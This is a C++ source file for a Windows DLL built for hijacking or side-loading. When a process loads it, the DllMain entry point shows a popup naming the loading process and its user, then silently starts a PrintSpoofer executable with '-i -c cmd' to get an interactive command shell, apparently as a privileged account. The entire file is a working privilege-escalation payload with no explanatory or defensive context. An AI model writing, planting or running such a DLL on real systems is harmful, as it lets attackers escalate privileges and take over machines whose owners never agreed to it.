#include <Windows.h>
#include <stdio.h>
#include <stdint.h>
#include <wtsapi32.h>
#include <Lmcons.h>
#include <iostream>
#include <string>

#pragma comment(lib, "Wtsapi32.lib")

using namespace std;

#define EXEC_COMMAND_LINE L"C:\\ProgramData\\PrintSpoofer1.exe -i -c cmd"

wstring expandPath(const wchar_t* input) {
	wchar_t szEnvPath[MAX_PATH];
	::ExpandEnvironmentStringsW(input, szEnvPath, MAX_PATH);
	return szEnvPath;
}

auto getUsername() {
	wchar_t usernamebuf[UNLEN + 1];
	DWORD size = UNLEN + 1;
	GetUserName((TCHAR*)usernamebuf, &size);
	static auto username = wstring{ usernamebuf };
	return username;
}

auto getProcessFilename() {
	wchar_t process_filenamebuf[MAX_PATH]{ 0x0000 };
	GetModuleFileNameW(0, process_filenamebuf, MAX_PATH);
	static auto process_filename = wstring{ process_filenamebuf };
	return process_filename;
}

auto getModuleFilename(HMODULE hModule = nullptr) {
	wchar_t module_filenamebuf[MAX_PATH]{ 0x0000 };
	if (hModule != nullptr) GetModuleFileNameW(hModule, module_filenamebuf, MAX_PATH);
	static auto module_filename = wstring{ module_filenamebuf };
	return module_filename;
}

void DEBUG(LPCWSTR Format, ...)
{
	va_list args;
	va_start(args, Format);

	wchar_t Buf[5000] = { 0 };
	wvsprintf(Buf, Format, args);
	va_end(args);

	DWORD messageAnswer{};
	WTSSendMessageW(WTS_CURRENT_SERVER_HANDLE, WTSGetActiveConsoleSessionId(), (wchar_t*)L"", 0, Buf, wcslen(Buf) * 2, 0, 0, &messageAnswer, true);
}

BOOL AttemptProcessCreation() {
	PROCESS_INFORMATION ProcInfo = { 0 };
	STARTUPINFOW StartupInfo = { 0 };
	BOOL bSuccess = FALSE;
	wchar_t CommandLine[MAX_PATH] = { 0 };

	wcscpy_s(CommandLine, MAX_PATH, EXEC_COMMAND_LINE);
	StartupInfo.cb = sizeof(StartupInfo);

	if ((bSuccess = CreateProcessW(nullptr, CommandLine, nullptr, nullptr, false, DETACHED_PROCESS, nullptr, nullptr, &StartupInfo, &ProcInfo))) {
		CloseHandle(ProcInfo.hProcess);
		CloseHandle(ProcInfo.hThread);
	}

	return bSuccess;
}

BOOL WINAPI DllMain(HINSTANCE hInstance, uint32_t dwReason, void* pReserved) {
	if (dwReason == DLL_PROCESS_ATTACH) {
		getModuleFilename(hInstance);
		DEBUG(L"DLL %ws loaded by process %ws running as %ws", getModuleFilename().c_str(), getProcessFilename().c_str(), getUsername().c_str());

		if (AttemptProcessCreation()) {
			DEBUG(L"Successfully created process");
		}
		else {
			DEBUG(L"Failed to create process (error %d)", GetLastError());
		}
	}

	return TRUE;
}